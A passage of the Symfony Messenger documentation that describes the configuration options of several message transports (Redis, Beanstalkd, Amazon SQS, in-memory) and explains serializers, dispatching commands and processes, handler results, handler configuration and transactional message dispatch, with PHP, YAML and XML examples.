`LISTEN/NOTIFY`_ feature. This allow for a more performant approach\nthan the default polling behavior of the Doctrine transport because\nPostgreSQL will directly notify the workers when a new message is inserted\nin the table.\n\n``use_notify`` (default: ``true``)\n    Whether to use LISTEN/NOTIFY.\n\n``check_delayed_interval`` (default: ``60000``)\n    The interval to check for delayed messages, in milliseconds. Set to 0 to\n    disable checks.\n\n``get_notify_timeout`` (default: ``0``)\n    The length of time to wait for a response when calling\n    ``PDO::pgsqlGetNotify``, in milliseconds.\n\nBeanstalkd Transport\n~~~~~~~~~~~~~~~~~~~~\n\nThe Beanstalkd transport sends messages directly to a Beanstalkd work queue. Install\nit by running:\n\n.. code-block:: terminal\n\n    $ composer require symfony/beanstalkd-messenger\n\nThe Beanstalkd transport DSN may looks like this:\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=beanstalkd://localhost:11300?tube_name=foo&timeout=4&ttr=120\n\n    # If no port, it will default to 11300\n    MESSENGER_TRANSPORT_DSN=beanstalkd://localhost\n\nThe transport has a number of options:\n\n``tube_name`` (default: ``default``)\n    Name of the queue\n\n``timeout`` (default: ``0``)\n    Message reservation timeout - in seconds. 0 will cause the server to\n    immediately return either a response or a TransportException will be thrown.\n\n``ttr`` (default: ``90``)\n    The message time to run before it is put back in the ready queue - in\n    seconds.\n\n.. _messenger-redis-transport:\n\nRedis Transport\n~~~~~~~~~~~~~~~\n\nThe Redis transport uses `streams`_ to queue messages. This transport requires\nthe Redis PHP extension (>=4.3) and a running Redis server (^5.0). Install it by\nrunning:\n\n.. code-block:: terminal\n\n    $ composer require symfony/redis-messenger\n\nThe Redis transport DSN may looks like this:\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=redis://localhost:6379/messages\n    # Full DSN Example\n    MESSENGER_TRANSPORT_DSN=redis://password@localhost:6379/messages/symfony/consumer?auto_setup=true&serializer=1&stream_max_entries=0&dbindex=0\n    # Redis Cluster Example\n    MESSENGER_TRANSPORT_DSN=redis://host-01:6379,redis://host-02:6379,redis://host-03:6379,redis://host-04:6379\n    # Unix Socket Example\n    MESSENGER_TRANSPORT_DSN=redis:///var/run/redis.sock\n    # TLS Example\n    MESSENGER_TRANSPORT_DSN=rediss://localhost:6379/messages\n    # Multiple Redis Sentinel Hosts Example\n    MESSENGER_TRANSPORT_DSN=redis:?host[redis1:26379]&host[redis2:26379]&host[redis3:26379]&sentinel_master=db\n\nA number of options can be configured via the DSN or via the ``options`` key\nunder the transport in ``messenger.yaml``:\n\n``stream`` (default: ``messages``)\n    The Redis stream name\n\n``group`` (default: ``symfony``)\n    The Redis consumer group name\n\n``consumer`` (default: ``consumer``)\n    Consumer name used in Redis\n\n``auto_setup`` (default: ``true``)\n    Whether to create the Redis group automatically\n\n``auth``\n    The Redis password\n\n``delete_after_ack`` (default: ``true``)\n    If ``true``, messages are deleted automatically after processing them\n\n``delete_after_reject`` (default: ``true``)\n    If ``true``, messages are deleted automatically if they are rejected\n\n``lazy`` (default: ``false``)\n    Connect only when a connection is really needed\n\n``serializer`` (default: ``Redis::SERIALIZER_PHP``)\n    How to serialize the final payload in Redis (the ``Redis::OPT_SERIALIZER`` option)\n\n``stream_max_entries`` (default: ``0``)\n    The maximum number of entries which the stream will be trimmed to. Set it to\n    a large enough number to avoid losing pending messages\n\n``redeliver_timeout`` (default: ``3600``)\n    Timeout (in seconds) before retrying a pending message which is owned by an abandoned consumer\n    (if a worker died for some reason, this will occur, eventually you should retry the message).\n\n``claim_interval`` (default: ``60000``)\n    Interval on which pending/abandoned messages should be checked for to claim - in milliseconds\n\n``persistent_id`` (default: ``null``)\n    String, if null connection is non-persistent.\n\n``retry_interval`` (default: ``0``)\n    Int, value in milliseconds\n\n``read_timeout`` (default: ``0``)\n    Float, value in seconds default indicates unlimited\n\n``timeout`` (default: ``0``)\n    Connection timeout. Float, value in seconds default indicates unlimited\n\n``sentinel_master`` (default: ``null``)\n    String, if null or empty Sentinel support is disabled\n\n``redis_sentinel`` (default: ``null``)\n    An alias of the ``sentinel_master`` option\n\n    .. versionadded:: 7.1\n\n        The ``redis_sentinel`` option was introduced in Symfony 7.1.\n\n``ssl`` (default: ``null``)\n    Map of `SSL context options`_ for the TLS channel. This is useful for example\n    to change the requirements for the TLS channel in tests:\n\n    .. code-block:: yaml\n\n        # config/packages/test/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    redis:\n                        dsn: \"rediss://localhost\"\n                        options:\n                            ssl:\n                                allow_self_signed: true\n                                capture_peer_cert: true\n                                capture_peer_cert_chain: true\n                                disable_compression: true\n                                SNI_enabled: true\n                                verify_peer: true\n                                verify_peer_name: true\n\n.. warning::\n\n    There should never be more than one ``messenger:consume`` command running with the same\n    combination of ``stream``, ``group`` and ``consumer``, or messages could end up being\n    handled more than once. If you run multiple queue workers, ``consumer`` can be set to an\n    environment variable, like ``%env(MESSENGER_CONSUMER_NAME)%``, set by Supervisor\n    (example below) or any other service used to manage the worker processes.\n    In a container environment, the ``HOSTNAME`` can be used as the consumer name, since\n    there is only one worker per container/host. If using Kubernetes to orchestrate the\n    containers, consider using a ``StatefulSet`` to have stable names.\n\n.. tip::\n\n    Set ``delete_after_ack`` to ``true`` (if you use a single group) or define\n    ``stream_max_entries`` (if you can estimate how many max entries is acceptable\n    in your case) to avoid memory leaks. Otherwise, all messages will remain\n    forever in Redis.\n\nIn Memory Transport\n~~~~~~~~~~~~~~~~~~~\n\nThe ``in-memory`` transport does not actually deliver messages. Instead, it\nholds them in memory during the request, which can be useful for testing.\nFor example, if you have an ``async_priority_normal`` transport, you could\noverride it in the ``test`` environment to use this transport:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/test/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async_priority_normal: 'in-memory://'\n\n    .. code-block:: xml\n\n        <!-- config/packages/test/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async_priority_normal\" dsn=\"in-memory://\"/>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/test/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->transport('async_priority_normal')\n                ->dsn('in-memory://');\n        };\n\nThen, while testing, messages will *not* be delivered to the real transport.\nEven better, in a test, you can check that exactly one message was sent\nduring a request::\n\n    // tests/Controller/DefaultControllerTest.php\n    namespace App\\Tests\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;\n    use Symfony\\Component\\Messenger\\Transport\\InMemory\\InMemoryTransport;\n\n    class DefaultControllerTest extends WebTestCase\n    {\n        public function testSomething(): void\n        {\n            $client = static::createClient();\n            // ...\n\n            $this->assertSame(200, $client->getResponse()->getStatusCode());\n\n            /** @var InMemoryTransport $transport */\n            $transport = $this->getContainer()->get('messenger.transport.async_priority_normal');\n            $this->assertCount(1, $transport->getSent());\n        }\n    }\n\nThe transport has a number of options:\n\n``serialize`` (boolean, default: ``false``)\n    Whether to serialize messages or not. This is useful to test an additional\n    layer, especially when you use your own message serializer.\n\n.. note::\n\n    All ``in-memory`` transports will be reset automatically after each test **in**\n    test classes extending\n    :class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\KernelTestCase`\n    or :class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\WebTestCase`.\n\nAmazon SQS\n~~~~~~~~~~\n\nThe Amazon SQS transport is perfect for applications hosted on AWS. Install it by\nrunning:\n\n.. code-block:: terminal\n\n    $ composer require symfony/amazon-sqs-messenger\n\nThe SQS transport DSN may looks like this:\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=https://sqs.eu-west-3.amazonaws.com/123456789012/messages?access_key=AKIAIOSFODNN7EXAMPLE&secret_key=j17M97ffSVoKI0briFoo9a\n    MESSENGER_TRANSPORT_DSN=sqs://localhost:9494/messages?sslmode=disable\n\n.. note::\n\n    The transport will automatically create queues that are needed. This\n    can be disabled by setting the ``auto_setup`` option to ``false``.\n\n.. tip::\n\n    Before sending or receiving a message, Symfony needs to convert the queue\n    name into an AWS queue URL by calling the ``GetQueueUrl`` API in AWS. This\n    extra API call can be avoided by providing a DSN which is the queue URL.\n\nThe transport has a number of options:\n\n``access_key``\n    AWS access key (must be urlencoded)\n\n``account`` (default: The owner of the credentials)\n    Identifier of the AWS account\n\n``auto_setup`` (default: ``true``)\n    Whether the queue should be created automatically during send / get.\n\n``buffer_size`` (default: ``9``)\n    Number of messages to prefetch\n\n``debug`` (default: ``false``)\n    If ``true`` it logs all HTTP requests and responses (it impacts performance)\n\n``endpoint`` (default: ``https://sqs.eu-west-1.amazonaws.com``)\n    Absolute URL to the SQS service\n\n``poll_timeout`` (default: ``0.1``)\n    Wait for new message duration in seconds\n\n``queue_name`` (default: ``messages``)\n    Name of the queue\n\n``region`` (default: ``eu-west-1``)\n    Name of the AWS region\n\n``secret_key``\n    AWS secret key (must be urlencoded)\n\n``session_token``\n    AWS session token\n\n``visibility_timeout`` (default: Queue's configuration)\n    Amount of seconds the message will not be visible (`Visibility Timeout`_)\n\n``wait_time`` (default: ``20``)\n    `Long polling`_ duration in seconds\n\n.. note::\n\n    The ``wait_time`` parameter defines the maximum duration Amazon SQS should\n    wait until a message is available in a queue before sending a response.\n    It helps reducing the cost of using Amazon SQS by eliminating the number\n    of empty responses.\n\n    The ``poll_timeout`` parameter defines the duration the receiver should wait\n    before returning null. It avoids blocking other receivers from being called.\n\n.. note::\n\n    If the queue name is suffixed by ``.fifo``, AWS will create a `FIFO queue`_.\n    Use the stamp :class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\AmazonSqs\\\\Transport\\\\AmazonSqsFifoStamp`\n    to define the ``Message group ID`` and the ``Message deduplication ID``.\n\n    Another possibility is to enable the\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\AmazonSqs\\\\Middleware\\\\AddFifoStampMiddleware`.\n    If your message implements\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\AmazonSqs\\\\MessageDeduplicationAwareInterface`,\n    the middleware will automatically add the\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\AmazonSqs\\\\Transport\\\\AmazonSqsFifoStamp`\n    and set the ``Message deduplication ID``. Additionally, if your message implements the\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\AmazonSqs\\\\MessageGroupAwareInterface`,\n    the middleware will automatically set the ``Message group ID`` of the stamp.\n\n    You can learn more about middlewares in\n    :ref:`the dedicated section <messenger_middleware>`.\n\n    FIFO queues don't support setting a delay per message, a value of ``delay: 0``\n    is required in the retry strategy settings.\n\nSerializing Messages\n~~~~~~~~~~~~~~~~~~~~\n\nWhen messages are sent to (and received from) a transport, they're serialized\nusing PHP's native ``serialize()`` & ``unserialize()`` functions. You can change\nthis globally (or for each transport) to a service that implements\n:class:`Symfony\\\\Component\\\\Messenger\\\\Transport\\\\Serialization\\\\SerializerInterface`:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                serializer:\n                    default_serializer: messenger.transport.symfony_serializer\n                    symfony_serializer:\n                        format: json\n                        context: { }\n\n                transports:\n                    async_priority_normal:\n                        dsn: # ...\n                        serializer: messenger.transport.symfony_serializer\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:serializer default-serializer=\"messenger.transport.symfony_serializer\">\n                        <framework:symfony-serializer format=\"json\">\n                            <framework:context/>\n                        </framework:symfony-serializer>\n                    </framework:serializer>\n\n                    <framework:transport name=\"async_priority_normal\" dsn=\"...\" serializer=\"messenger.transport.symfony_serializer\"/>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->serializer()\n                ->defaultSerializer('messenger.transport.symfony_serializer')\n                ->symfonySerializer()\n                    ->format('json')\n                    ->context('foo', 'bar');\n\n            $messenger->transport('async_priority_normal')\n                ->dsn('...')\n                ->serializer('messenger.transport.symfony_serializer');\n        };\n\nThe ``messenger.transport.symfony_serializer`` is a built-in service that uses\nthe :doc:`Serializer component </serializer>` and can be configured in a few ways.\nIf you *do* choose to use the Symfony serializer, you can control the context\non a case-by-case basis via the :class:`Symfony\\\\Component\\\\Messenger\\\\Stamp\\\\SerializerStamp`\n(see `Envelopes & Stamps`_).\n\n.. tip::\n\n    When sending/receiving messages to/from another application, you may need\n    more control over the serialization process. Using a custom serializer\n    provides that control. See `SymfonyCasts' message serializer tutorial`_ for\n    details.\n\nRunning Commands And External Processes\n---------------------------------------\n\nTrigger a Command\n~~~~~~~~~~~~~~~~~\n\nIt is possible to trigger any command by dispatching a\n:class:`Symfony\\\\Component\\\\Console\\\\Messenger\\\\RunCommandMessage`. Symfony\nwill take care of handling this message and execute the command passed\nto the message parameter::\n\n    use Symfony\\Component\\Console\\Messenger\\RunCommandMessage;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    class CleanUpService\n    {\n        public function __construct(private readonly MessageBusInterface $bus)\n        {\n        }\n\n        public function cleanUp(): void\n        {\n            // Long task with some caching...\n\n            // Once finished, dispatch some clean up commands\n            $this->bus->dispatch(new RunCommandMessage('app:my-cache:clean-up --dir=var/temp'));\n            $this->bus->dispatch(new RunCommandMessage('cache:clear'));\n        }\n    }\n\nYou can configure the behavior in the case of something going wrong during command\nexecution. To do so, you can use the ``throwOnFailure`` and ``catchExceptions``\nparameters when creating your instance of\n:class:`Symfony\\\\Component\\\\Console\\\\Messenger\\\\RunCommandMessage`.\n\nOnce handled, the handler will return a\n:class:`Symfony\\\\Component\\\\Console\\\\Messenger\\\\RunCommandContext` which\ncontains many useful information such as the exit code or the output of the\nprocess. You can refer to the page dedicated on\n:ref:`handler results <messenger-getting-handler-results>` for more information.\n\nTrigger An External Process\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMessenger comes with a handy helper to run external processes by\ndispatching a message. This takes advantages of the\n:doc:`Process component </components/process>`. By dispatching a\n:class:`Symfony\\\\Component\\\\Process\\\\Messenger\\\\RunProcessMessage`, Messenger\nwill take care of creating a new process with the parameters you passed::\n\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n    use Symfony\\Component\\Process\\Messenger\\RunProcessMessage;\n\n    class CleanUpService\n    {\n        public function __construct(private readonly MessageBusInterface $bus)\n        {\n        }\n\n        public function cleanUp(): void\n        {\n            $this->bus->dispatch(new RunProcessMessage(['rm', '-rf', 'var/log/temp/*'], cwd: '/my/custom/working-dir'));\n\n            // ...\n        }\n    }\n\nOnce handled, the handler will return a\n:class:`Symfony\\\\Component\\\\Process\\\\Messenger\\\\RunProcessContext` which\ncontains many useful information such as the exit code or the output of the\nprocess. You can refer to the page dedicated on\n:ref:`handler results <messenger-getting-handler-results>` for more information.\n\nPinging A Webservice\n--------------------\n\nSometimes, you may need to regularly ping a webservice to get its status, e.g.\nis it up or down. It is possible to do so by dispatching a\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Messenger\\\\PingWebhookMessage`::\n\n    use Symfony\\Component\\HttpClient\\Messenger\\PingWebhookMessage;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    class LivenessService\n    {\n        public function __construct(private readonly MessageBusInterface $bus)\n        {\n        }\n\n        public function ping(): void\n        {\n            // An HttpExceptionInterface is thrown on 3xx/4xx/5xx\n            $this->bus->dispatch(new PingWebhookMessage('GET', 'https://example.com/status'));\n\n            // Ping, but does not throw on 3xx/4xx/5xx\n            $this->bus->dispatch(new PingWebhookMessage('GET', 'https://example.com/status', throw: false));\n\n            // Any valid HttpClientInterface option can be used\n            $this->bus->dispatch(new PingWebhookMessage('POST', 'https://example.com/status', [\n                'headers' => [\n                    'Authorization' => 'Bearer ...'\n                ],\n                'json' => [\n                    'data' => 'some-data',\n                ],\n            ]));\n        }\n    }\n\nThe handler will return a\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\ResponseInterface`, allowing you to\ngather and process information returned by the HTTP request.\n\nGetting Results from your Handlers\n----------------------------------\n\nWhen a message is handled, the :class:`Symfony\\\\Component\\\\Messenger\\\\Middleware\\\\HandleMessageMiddleware`\nadds a :class:`Symfony\\\\Component\\\\Messenger\\\\Stamp\\\\HandledStamp` for each object that handled the message.\nYou can use this to get the value returned by the handler(s)::\n\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n    use Symfony\\Component\\Messenger\\Stamp\\HandledStamp;\n\n    $envelope = $messageBus->dispatch(new SomeMessage());\n\n    // get the value that was returned by the last message handler\n    $handledStamp = $envelope->last(HandledStamp::class);\n    $handledStamp->getResult();\n\n    // or get info about all of handlers\n    $handledStamps = $envelope->all(HandledStamp::class);\n\n.. _messenger-getting-handler-results:\n\nGetting Results when Working with Command & Query Buses\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe Messenger component can be used in CQRS architectures where command & query\nbuses are central pieces of the application. Read Martin Fowler's\n`article about CQRS`_ to learn more and\n:ref:`how to configure multiple buses <messenger-multiple-buses>`.\n\nAs queries are usually synchronous and expected to be handled once,\ngetting the result from the handler is a common need.\n\nA :class:`Symfony\\\\Component\\\\Messenger\\\\HandleTrait` exists to get the result\nof the handler when processing synchronously. It also ensures that exactly one\nhandler is registered. The ``HandleTrait`` can be used in any class that has a\n``$messageBus`` property::\n\n    // src/Action/ListItems.php\n    namespace App\\Action;\n\n    use App\\Message\\ListItemsQuery;\n    use App\\MessageHandler\\ListItemsQueryResult;\n    use Symfony\\Component\\Messenger\\HandleTrait;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    class ListItems\n    {\n        use HandleTrait;\n\n        public function __construct(\n            private MessageBusInterface $messageBus,\n        ) {\n        }\n\n        public function __invoke(): void\n        {\n            $result = $this->query(new ListItemsQuery(/* ... */));\n\n            // Do something with the result\n            // ...\n        }\n\n        // Creating such a method is optional, but allows type-hinting the result\n        private function query(ListItemsQuery $query): ListItemsQueryResult\n        {\n            return $this->handle($query);\n        }\n    }\n\nHence, you can use the trait to create command & query bus classes.\nFor example, you could create a special ``QueryBus`` class and inject it\nwherever you need a query bus behavior instead of the ``MessageBusInterface``::\n\n    // src/MessageBus/QueryBus.php\n    namespace App\\MessageBus;\n\n    use Symfony\\Component\\Messenger\\Envelope;\n    use Symfony\\Component\\Messenger\\HandleTrait;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    class QueryBus\n    {\n        use HandleTrait;\n\n        public function __construct(\n            private MessageBusInterface $messageBus,\n        ) {\n        }\n\n        /**\n         * @param object|Envelope $query\n         *\n         * @return mixed The handler returned value\n         */\n        public function query($query): mixed\n        {\n            return $this->handle($query);\n        }\n    }\n\nCustomizing Handlers\n--------------------\n\n.. _messenger-handler-config:\n\nManually Configuring Handlers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony will normally :ref:`find and register your handler automatically <messenger-handler>`.\nBut, you can also configure a handler manually - and pass it some extra config -\nwhile using ``#AsMessageHandler`` attribute or tagging the handler service\nwith ``messenger.message_handler``.\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/MessageHandler/SmsNotificationHandler.php\n        namespace App\\MessageHandler;\n\n        use App\\Message\\OtherSmsNotification;\n        use App\\Message\\SmsNotification;\n        use Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler;\n\n        #[AsMessageHandler(fromTransport: 'async', priority: 10)]\n        class SmsNotificationHandler\n        {\n            public function __invoke(SmsNotification $message): void\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            App\\MessageHandler\\SmsNotificationHandler:\n                tags: [messenger.message_handler]\n\n                # or configure with options\n                tags:\n                    -\n                        name: messenger.message_handler\n                        # only needed if can't be guessed by type-hint\n                        handles: App\\Message\\SmsNotification\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\MessageHandler\\SmsNotificationHandler\">\n                     <!-- handles is only needed if it can't be guessed by type-hint -->\n                     <tag name=\"messenger.message_handler\"\n                          handles=\"App\\Message\\SmsNotification\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        use App\\Message\\SmsNotification;\n        use App\\MessageHandler\\SmsNotificationHandler;\n\n        $container->register(SmsNotificationHandler::class)\n            ->addTag('messenger.message_handler', [\n                // only needed if can't be guessed by type-hint\n                'handles' => SmsNotification::class,\n            ]);\n\nPossible options to configure with tags are:\n\n``bus``\n    Name of the bus from which the handler can receive messages, by default all buses.\n\n``from_transport``\n    Name of the transport from which the handler can receive messages, by default\n    all transports.\n\n``handles``\n    Type of messages (FQCN) that can be processed by the handler, only needed if\n    can't be guessed by type-hint.\n\n``method``\n    Name of the method that will process the message.\n\n``priority``\n    Priority of the handler when multiple handlers can process the same message.\n\n.. _handler-subscriber-options:\n\nHandling Multiple Messages\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nA single handler class can handle multiple messages. For that add the\n``#AsMessageHandler`` attribute to all the handling methods::\n\n    // src/MessageHandler/SmsNotificationHandler.php\n    namespace App\\MessageHandler;\n\n    use App\\Message\\OtherSmsNotification;\n    use App\\Message\\SmsNotification;\n\n    class SmsNotificationHandler\n    {\n        #[AsMessageHandler]\n        public function handleSmsNotification(SmsNotification $message): void\n        {\n            // ...\n        }\n\n        #[AsMessageHandler]\n        public function handleOtherSmsNotification(OtherSmsNotification $message): void\n        {\n            // ...\n        }\n    }\n\n.. _messenger-transactional-messages:\n\nTransactional Messages: Handle New Messages After Handling is Done\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nA message handler can ``dispatch`` new messages while handling others, to either\nthe same or a different bus (if the application has\n:ref:`multiple buses <messenger-multiple-buses>`). Any errors or exceptions that\noccur during this process can have unintended consequences, such as:\n\n#. If using the ``DoctrineTransactionMiddleware`` and a dispatched message throws\n   an exception, then any database transactions in the original handler will be\n   rolled back.\n#. If the message is dispatched to a different bus, then the dispatched message\n   will be handled even if some code later in the current handler throws an exception.\n\nAn Example ``RegisterUser`` Process\n...................................\n\nConsider an application with both a *command* and an *event* bus. The application\ndispatches a command named ``RegisterUser`` to the command bus. The command is\nhandled by the ``RegisterUserHandler`` which creates a ``User`` object, stores\nthat object to a database and dispatches a ``UserRegistered`` message to the event bus.\n\nThere are many handlers to the ``UserRegistered`` message, one handler may send\na welcome email to the new user. We are using the ``DoctrineTransactionMiddleware``\nto wrap all database queries in one database transaction.\n\n**Problem 1:** If an exception is thrown when sending the welcome email, then\nthe user will not be created because the ``DoctrineTransactionMiddleware`` will\nrollback the Doctrine transaction, in which the user has been created.\n\n**Problem 2:** If an exception is thrown when saving the user to the database,\nthe welcome email is still sent because it is handled asynchronously.\n\nDispatchAfterCurrentBusMiddleware Middleware\n............................................\n\nFor many applications, the desired behavior is to *only* handle messages that\nare dispatched by a handler once that handler has fully finished. This can be done by\nusing the ``DispatchAfterCurrentBusMiddleware`` and adding a\n``DispatchAfterCurrentBusStamp`` stamp to :ref:`the message Envelope <messenger-envelopes>`::\n\n    // src/Messenger/CommandHandler/RegisterUserHandler.php\n    namespace App\\Messenger\\CommandHandler;\n\n    use App\\Entity\\User;\n    use App\\Messenger\\Command\\RegisterUser;\n    use App\\Messenger\\Event\\UserRegistered;\n    use Doctrine\\ORM\\EntityManagerInterface;\n    use Symfony\\Component\\Messenger\\Envelope;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n    use Symfony\\Component\\Messenger\\Stamp\\DispatchAfterCurrentBusStamp;\n\n    class RegisterUserHandler\n    {\n        public function __construct(\n            private MessageBusInterface $eventBus,\n            private EntityManagerInterface $em,\n        ) {\n        }\n\n        public function __invoke(RegisterUser $command): void\n        {\n            $user = new User($command->getUuid(), $command->getName(), $command->getEmail());\n            $this->em->persist($user);\n\n            // The DispatchAfterCurrentBusStamp marks the event message to be handled\n            // only if this handler does not throw an exception.\n\n            $event = new UserRegistered($command->getUuid());\n            $this->eventBus->dispatch(\n                (new Envelope($event))\n                    ->with(new DispatchAfterCurrentBusStamp())\n            );\n\n            // ...\n        }\n    }\n\n.. code-block:: php\n\n    // src/Messenger/EventSubscriber/WhenUserRegisteredThenSendWelcomeEmail.php\n    namespace App\\Messenger\\EventSubscriber;\n\n    use App\\Entity\\User;\n    use App\\Messenger\\Event\\UserRegistered;\n    use Doctrine\\ORM\\EntityManagerInterface;\n    use Symfony\\Component\\Mailer\\MailerInterface;\n    use Symfony\\Component\\Mime\\RawMessage;\n\n    class WhenUserRegisteredThenSendWelcomeEmail\n    {\n        public function __construct(\n            private MailerInterface $mailer,\n            EntityManagerInterface $em,\n        ) {\n        }\n\n        public function __invoke(UserRegistered $event): void\n        {\n            $user = $this->em->getRepository(User::class)->find($event->getUuid());\n\n            $this->mailer->send(new RawMessage('Welcome '.$user->getFirstName()));\n        }\n    }\n\nThis means that the ``UserRegistered`` message would not be handled until\n*after* the ``RegisterUserHandler`` had completed and the new ``User`` was\npersisted to the database. If the ``RegisterUserHandler`` encounters an\nexception, the ``UserRegistered`` event will never be handled. And if an\nexception is thrown while sending the welcome email, the Doctrine transaction\nwill not be rolled back.\n\n.. note::\n\n    If ``WhenUserRegisteredThenSendWelcomeEmail`` throws an exception, that\n    exception will be wrapped into a ``DelayedMessageHandlingException``. Using\n    ``DelayedMessageHandlingException::getWrappedExceptions`` will give you all\n    exceptions that are thrown while handling a message with the\n    ``DispatchAfterCurrentBusStamp``.\n\nThe ``dispatch_after_current_bus`` middleware is enabled by default. If you're\nconfiguring your middleware manually, be sure to register\n``dispatch_after_current_bus`` before ``doctrine_transaction`` in the middleware\nchain. Also, the ``dispatch_after_current_bus`` middleware must be loaded for\n*all* of the buses being used.\n\nBinding Handlers to Different Transports\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nEach message can have multiple handlers, and when a message is consumed\n*all* of its handlers are called. But you can also configure a handler to only\nbe called when it's received from a *specific* transport. This allows you to\nhave a single message where each handler is called by a different \"worker\"\nthat's consuming a different transport.\n\nSuppose you have an ``UploadedImage`` message with two handlers:\n\n* ``ThumbnailUploadedImageHandler``: you want this to be handled by\n  a transport called ``image_transport``\n\n* ``NotifyAboutNewUploadedImageHandler``: you want this to be handled\n  by a transport called ``async_priority_normal``\n\nTo do this, add the ``from_transport`` option to each handler. For example::\n\n    // src/MessageHandler/ThumbnailUploadedImageHandler.php\n    namespace App\\MessageHandler;\n\n    use App\\Message\\UploadedImage;\n\n    #[AsMessageHandler(fromTransport: 'image_transport')]\n    class ThumbnailUploadedImageHandler\n    {\n        public function __invoke(UploadedImage $uploadedImage): void\n        {\n            // do some thumbnailing\n        }\n    }\n\nAnd similarly::\n\n    // src/MessageHandler/NotifyAboutNewUploadedImageHandler.php\n    // ...\n\n    #[AsMessageHandler(fromTransport: 'async_priority_normal')]\n    class NotifyAboutNewUploadedImageHandler\n    {\n        // ...\n    }\n\nThen, make sure to \"route\" your message to *both* transports:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async_priority_normal: # ...\n                    image_transport: # ...\n\n                routing:\n                    # ...\n                    'App\\Message\\UploadedImage': [image_transport, async_priority_normal]\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async_priority_normal\" dsn=\"...\"/>\n                    <framework:transport name=\"image_transport\" dsn=\"...\"/>\n\n                    